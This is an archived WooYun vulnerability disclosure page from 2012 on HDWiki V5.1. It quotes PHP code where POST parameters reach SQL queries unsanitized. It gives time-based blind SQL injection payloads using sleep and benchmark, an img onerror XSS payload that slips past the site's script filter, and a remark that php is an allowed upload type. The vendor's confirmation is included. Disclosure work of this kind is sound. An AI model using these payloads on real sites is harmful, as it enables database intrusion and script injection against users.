@@ -1,0 +1,364 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		HDWiKi V5.1 盲注及xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		HDWiKi V5.1 盲注及xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/yy520">yy520</a> 
+</li><li>提交时间：		2012-09-11 11:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-09-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-09-11：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-09-14：	细节向第三方安全合作伙伴开放<br/>
+									2012-09-21：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-10-01：	细节向普通白帽子公开<br/>
+									2012-10-21：	细节向实习白帽子公开<br/>
+									2012-10-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">HDWiki 在经过前面的大牛洗礼之后，变得越来越安全了，小菜我也只能找到几个盲注和xss而已<br />
+PS：求别忽略<br />
+PSS:漏洞是自己的，rank是剑心的，所以.....你懂得 ~。~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在经过前面的大牛洗礼之后，变得越来越安全了，get被不分青红皂白的过滤掉一堆关键字，get注入几乎是不大可能的了，所以我只找了post<br />
+<br />
+1<br />
+<br />
+</p><pre><code>control/user.php<br />
+<br />
+ 177    function doaegis(){<br />
+ 178          $id=$this-&gt;post[&#039;id&#039;];  //vulnerable<br />
+ 179          if(empty($id)){<br />
+ 180              $this-&gt;message(-1,&#039;&#039;,2);<br />
+ 181          }<br />
+ 182          if($_ENV[&quot;comment&quot;]-&gt;is_in_cookie(&#039;aegis&#039;,$id)){<br />
+ 183              $this-&gt;message(-2,&#039;&#039;,2);<br />
+ 184          }<br />
+ 185          $_ENV[&quot;comment&quot;]-&gt;update_field(&#039;aegis&#039;,1,$id,0);<br />
+ 186          $this-&gt;message($id,&#039;&#039;,2);<br />
+ 187      }<br />
+  <br />
+model/comment.class.php<br />
+  56    function update_field($field,$value,$id,$type=1){<br />
+  57          if($type){<br />
+  58              $sql=&quot;UPDATE &quot;.DB_TABLEPRE.&quot;comment SET $field=&#039;$value&#039; WHERE id= $id &quot;;<br />
+  59          }else{<br />
+  60              $sql=&quot;UPDATE &quot;.DB_TABLEPRE.&quot;comment SET $field=$field+$value WHERE id= $id &quot;;<br />
+  61          }<br />
+  62          $this-&gt;db-&gt;query($sql);<br />
+  63      }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+提交id=1 and if(substr((select 1),1,1)=1,sleep(10),1)<br />
+<br />
+实现盲注<br />
+<br />
+<br />
+<br />
+2<br />
+<br />
+</p><pre><code>189    function dooppose(){<br />
+ 190          $id=$this-&gt;post[&#039;id&#039;];   //vulnerable<br />
+ 191          if(empty($id)){<br />
+ 192              $this-&gt;message(-1,&#039;&#039;,2);<br />
+ 193          }<br />
+ 194          if($_ENV[&quot;comment&quot;]-&gt;is_in_cookie(&#039;oppose&#039;,$id)){<br />
+ 195              $this-&gt;message(-2,&#039;&#039;,2);<br />
+ 196          }<br />
+ 197          $_ENV[&quot;comment&quot;]-&gt;update_field(&#039;oppose&#039;,1,$id,0);<br />
+ 198          $this-&gt;message($id,&#039;&#039;,2);<br />
+ 199      }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+同上<br />
+<br />
+<br />
+<br />
+3<br />
+<br />
+</p><pre><code>control/gift.php<br />
+<br />
+  51    function doapply(){<br />
+  52          /*获取用户提交参数*/<br />
+<br />
+  53          $gid =$this-&gt;post[&#039;gid&#039;]; //礼品id //vulnerable<br />
+<br />
+….................. <br />
+  61          <br />
+  62          $gift=$_ENV[&#039;gift&#039;]-&gt;get($gid);//当前礼品<br />
+model/gift.class.php<br />
+  46    function get($id){<br />
+  47          return $this-&gt;db-&gt;fetch_first(&quot;SELECT * FROM &quot;.DB_TABLEPRE.&quot;gift WHERE id =&quot;.$id);<br />
+  48      }</code></pre><p class='detail'><br />
+<br />
+提交gid=1 and if(substr((select 1),1,1)=1,benchmark(1000000000,md5(534534)),1)<br />
+<br />
+<br />
+<br />
+4<br />
+<br />
+</p><pre><code>control/doc.php<br />
+1021    function dodelsave(){<br />
+1022          $aid=isset($this-&gt;get[2])?$this-&gt;get[2]:&#039;&#039;;<br />
+1023          if(empty($aid)){<br />
+1024              $aid=$this-&gt;post[&#039;checkid&#039;];  //vulnerable<br />
+1025              $num=count($aid);<br />
+1026              if($num&gt;0){<br />
+1027                  $aids=&#039;&#039;;<br />
+1028                  for($i=0;$i&lt;$num;$i++){<br />
+1029                      $aids.=$aid[$i].&#039;,&#039;;<br />
+1030                  }<br />
+1031                  $aids=substr($aids,0,-1);<br />
+1032                  $_ENV[&#039;doc&#039;]-&gt;del_autosave($aids);<br />
+<br />
+model/doc.class.php<br />
+  88            function del_autosave($aid,$uid=&#039;&#039;,$did=&#039;&#039;){<br />
+  89               if($aid != &#039;&#039;){<br />
+  90                   $sql=&quot;DELETE FROM &quot;.DB_TABLEPRE.&quot;autosave WHERE aid in ($aid)&quot;;<br />
+  91               }elseif($uid!=&#039;&#039; &amp;&amp; $did!=&#039;&#039;){<br />
+  92                   $sql=&quot;DELETE FROM &quot;.DB_TABLEPRE.&quot;autosave WHERE uid = &#039;$uid&#039; AND did = &#039;$did&#039;&quot;;<br />
+  93               }else{<br />
+  94                   return false;<br />
+  95               }<br />
+  96              return $this-&gt;db-&gt;query($sql);<br />
+  97      }</code></pre><p class='detail'><br />
+<br />
+checkid[]=1) or if(substr((select 1),1,1)=1,benchmark(1000000000,md5(534534)),1<br />
+<br />
+<br />
+<br />
+5<br />
+<br />
+</p><pre><code>control/user.php<br />
+<br />
+ 166    function doremove(){<br />
+ 167          $messageids = &#039;&#039;;<br />
+ 168          if($this-&gt;get[2]==&#039;single&#039;){<br />
+ 169              $alltype = array(1,2,3);<br />
+ 170              if(is_numeric($this-&gt;post[&#039;id&#039;]) &amp;&amp; in_array($this-&gt;post[&#039;type&#039;], $alltype)){<br />
+ 171                  $_ENV[&#039;pms&#039;]-&gt;update_pms($this-&gt;post[&#039;id&#039;],$this-&gt;post[&#039;type&#039;]);<br />
+ 172              }<br />
+ 173          }else{<br />
+ 174              $removeid = $this-&gt;post[&#039;checkid&#039;];  //vulnerable<br />
+ 175              $num = count($removeid);<br />
+ 176              $allowlist = array(&#039;inbox&#039;, &#039;outbox&#039;, &#039;drafts&#039;);<br />
+ 177              if(is_array($removeid) &amp;&amp; $num&gt;=1 &amp;&amp; in_array($this-&gt;get[3], $allowlist)){<br />
+ 178                  switch ($this-&gt;get[3]){<br />
+ 179                      case inbox:<br />
+ 180                          $type = 1;<br />
+ 181                          break;<br />
+ 182                      case outbox:<br />
+ 183                          $type = 2;<br />
+ 184                          break;<br />
+ 185                      case drafts:<br />
+ 186                          $type = 3;<br />
+ 187                          break;<br />
+ 188                  }                <br />
+ 189                  for($i=0; $i&lt;$num; $i++){<br />
+ 190                      $messageids .= $removeid[$i].&#039;,&#039;;<br />
+ 191                  }<br />
+ 192                  $messageids = substr($messageids, 0, -1);<br />
+ 193                  $result = $_ENV[&#039;pms&#039;]-&gt;update_pms($messageids, $type);<br />
+<br />
+model/pms.class.php<br />
+<br />
+ 127    function update_pms($messageids,$type){<br />
+ 128          $id = strpos($messageids , &#039;,&#039;) ? substr($messageids, 0, strpos($messageids, &#039;,&#039;)) : $messageids;<br />
+ 129          $pms = $this-&gt;get_pms($id);<br />
+ 130          if($pms[&#039;delstatus&#039;] == $type || $type == 3){<br />
+ 131              $result=$this-&gt;remove($messageids);<br />
+ 132          }else{<br />
+ 133              $type = ($type == 2) ? 1 : 2;<br />
+ 134              $result=$this-&gt;db-&gt;query(&quot;UPDATE &quot;.DB_TABLEPRE.&quot;pms SET delstatus=&#039;$type&#039; WHERE id in ($messageids)&quot;);<br />
+ 135          }<br />
+ 136          return $result;<br />
+ 137      }<br />
+ 139    function remove($messageids){<br />
+ 140          return($this-&gt;db-&gt;query(&quot;DELETE FROM &quot;.DB_TABLEPRE.&quot;pms WHERE id in ($messageids)&quot;));<br />
+ 141      }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+同上<br />
+<br />
+<br />
+<br />
+XSS<br />
+<br />
+编辑词条 正文过滤不严<br />
+<br />
+源代码编辑 插入 &lt;img onerror=&quot;alert(/yy520/)&quot; src=&quot;yy520.jpg&quot; /&gt;<br />
+<br />
+index.php?doc-view-51<br />
+<br />
+<br />
+<br />
+</p><pre><code>$doc[&#039;content&#039;] = string::stripscript($_ENV[&#039;doc&#039;]-&gt;replace_danger_word($this-&gt;post[&#039;content&#039;]));<br />
+<br />
+<br />
+ 227    function stripscript($string){<br />
+ 228          $pregfind=array(&quot;/&lt;script.*&gt;.*&lt;\/script&gt;/siU&quot;,&#039;/on(mousewheel|mouseover|click|load|onload|submit|focus|blur)=&quot;[^&quot;]*&quot;/i&#039;);<br />
+ 229          $pregreplace=array(&#039;&#039;,&#039;&#039;,);<br />
+ 230          $string=preg_replace($pregfind,$pregreplace,$string);<br />
+ 231          return $string;<br />
+ 232      }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+正文内容去敏感词 再去关键危险标签 可惜过滤不严<br />
+<br />
+<br />
+<br />
+上传的一点小问题<br />
+<br />
+<br />
+<br />
+./install/install.php:578:	(&#039;attachment_type&#039;, &#039;jpg|jpeg|bmp|gif|png|gz|bz2|zip|rar|doc|ppt|mp3|xls|txt|swf|flv|php|pdf&#039;),<br />
+<br />
+安装的时候把 php 也加到了可上传文件格式中，默认没开始上传附件，危害也不算大，就是看起来有点不顺眼而已 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/111114522938feaf03463cd35e38c2ffb9cca309.png" target="_blank"><img src="../images/111114522938feaf03463cd35e38c2ffb9cca309.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">：） </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/yy520" title="yy520">yy520</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012030" title="HDWiKi V5.1 盲注及xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-09-11 13:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经安排检查修复，非常感谢。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12030";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
